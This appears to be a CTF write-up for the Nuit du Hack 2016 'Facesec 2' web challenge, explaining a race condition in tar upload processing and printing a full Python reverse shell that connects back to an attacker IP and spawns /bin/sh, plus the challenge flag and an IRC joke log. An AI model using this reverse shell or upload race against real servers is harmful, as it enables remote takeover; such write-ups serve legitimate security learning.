# Nuit du Hack Qualifications CTF 2016: Facesec 2

**Category:** Web App |
**Points:** 150 |
**Solves:** 6 |
**Description:**

> _Description is missing, feel free to send a pull request_ 

## Write-up

_You can find a video of this write-up [here](https://youtu.be/H1kIzcLYo2U)._

This task is a website very similar to last year's Facesec: you can upload a
resume (cv.txt), a cover letter (motiv.txt) or a tar file containing both.

We did not manage to solve this task on time. We could solve it afterward with
the help from xeka_:
><xeka_> web 150, upload you x.py exploit and check upload/x.py i that time so
many times . race condition

When you upload a tar file, the server processes it for about 2 seconds. During
this time, it extracts your file to /upload/, and check that the correct files
exist, and that they're not symlinks. (You can find /upload/ in robots.txt)

During this windows, you can run python scripts embeded in your tar file.

We tar'd a reverse shell called `foo.py`, went to /upload/foo.py (which return
an error 404), uploaded it, and quickly refreshed the first tab to make the
server run our script.
```python
import socket
import subprocess
import os

IP = "127.0.0.1" # Replace with *YOUR* IP
port = 1234

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((IP, port))

fd = sock.fileno()
os.dup2(fd, 0);
os.dup2(fd, 1);
os.dup2(fd, 2);

subprocess.call(["/bin/sh", "-i"]);
```

Flag is stored in /var/www/app/flag

**Flag**: 6c401b82169dce09768e322661e04630

**Bonus**: Facesec2 became a meme on IRC

![Facesec2?](https://pbs.twimg.com/media/CfEe650WQAEtq9z.jpg)
```
<MrStorm_> facesec2 ?
<tomv> facesec2? someone? plz?
<MrStorm_> facesec2?
<xeka_> facesec2
*** MrStorm_ is now known as facesec2
-vic511- facesec2?
<Notfound> facesec2:
<sambecks> ##### facesec2 ? ####
<Notfound> ##### facesec2 ? #####
<hotab2> y u post no facesec2 writeup? =((
<Notfound> ##### facesec2 ? #####
<droo> facesec2
<Notfound> ##### facesec2 ? #####
<Timvde> Did anyone ask about facesec2 yet?
<Beuc>                                                          #####
<Beuc>  ######    ##     ####   ######   ####   ######   ####  #     #
<Beuc>  #        #  #   #    #  #       #       #       #    #       #
<Beuc>  #####   #    #  #       #####    ####   #####   #       #####
<Beuc>  #       ######  #       #            #  #       #      #
<Beuc>  #       #    #  #    #  #       #    #  #       #    # #
<Beuc>  #       #    #   ####   ######   ####   ######   ####  #######
```